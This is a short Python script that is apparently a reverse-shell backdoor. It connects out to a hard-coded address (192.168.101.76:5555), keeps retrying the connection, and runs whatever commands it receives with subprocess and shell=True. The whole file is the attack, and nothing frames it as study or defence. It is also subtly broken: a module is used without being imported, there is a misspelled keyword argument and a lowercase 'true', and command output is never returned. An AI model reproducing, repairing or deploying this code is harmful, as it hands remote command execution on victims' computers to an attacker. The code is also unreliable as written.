import socket 
import subprocess
import time 

def reliable_send(data):

    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():

    data = ''
    while True:
        try: 
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    time.sleep(20)
    try:
        s.connect(('192.168.101.76',5555))
        shell()
        s.close()
    except:
        connection()


def shell():
    while True:
        
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            execute = subprocess.Popen(command,shell=true,sydout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result =execute.stdout.read() + execute.stderr.read()
            result = result.decode()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()